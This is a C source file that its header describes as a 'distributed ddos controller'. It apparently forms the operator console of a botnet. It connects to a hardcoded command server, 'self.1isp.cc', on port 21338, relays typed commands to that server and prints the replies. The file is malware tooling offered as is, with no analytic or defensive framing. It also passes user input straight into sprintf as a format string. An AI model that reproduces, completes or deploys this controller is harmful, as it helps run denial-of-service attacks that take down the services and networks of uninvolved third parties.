/*
   created at 2015/5/28
   latest modified at 2015/5/28
   distributed ddos controller
 */

#include "tcpip/tcpip.h"
#include "utils/utils.h"
#include "core/core.h"
#include "alg/alexjlz_hash.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/select.h>
#include <unistd.h>
#include <errno.h>

char *server = "self.1isp.cc";
int main(int argc, char **argv)
{
    int fd = 0;
    int status = 0;
    int retval = 0;
    fd_set rfds;
    struct timeval tv;

    struct alexjlz_packet p; // alexjlz -> server
    struct alexjlz_packet q; // server -> alexjlz
    int bytes_read = 0;
    int bytes_write = 0;
    fd = connect_tcp_server("self.1isp.cc", 21338);

    while (1)
    {
        char * line = readline();
        bzero(&p, sizeof(p));
        sprintf(p.value, line);
        free(line);

        writen(fd, &p, sizeof(p));

        while ( 1 )
        {
            FD_ZERO(&rfds);
            FD_SET(fd, &rfds);
            tv.tv_sec = 3;
            tv.tv_usec = 0;
            retval = 0;

            retval = select(fd+1, &rfds, NULL, NULL, &tv); 
            if ( retval == -1 )  // error
            {
                fprintf(stdout, "Error, select: %s\n", strerror(errno));
                fflush(stdout);
                break;
            }
            else if ( retval == 0 )  // timeout
            {
                break;
            }
            else  // data aval
            {
                bytes_read = read(fd, &q, sizeof(q) );
                if ( bytes_read == -1 )
                {
                    fprintf(stderr, "Error: %s\n", strerror(errno)); 
                    exit(-1);
                }
                else if ( bytes_read == sizeof(q) )
                {
                    if ( strcmp(q.value, OUTPUT_END) == 0 )  // all data have been received
                        break;
                    fprintf(stdout, "%s", q.value);
                    fflush(stdout);
                }
                else
                {
                    fprintf(stdout, "Error, readn not enough bytes:%d\n", bytes_read);
                    fprintf(stdout, "The data we read: %s\n", q.value);
                    break;
                }
            }
        }
    }

    if ( check_fd(fd) )
        close(fd);

    return 0;
}
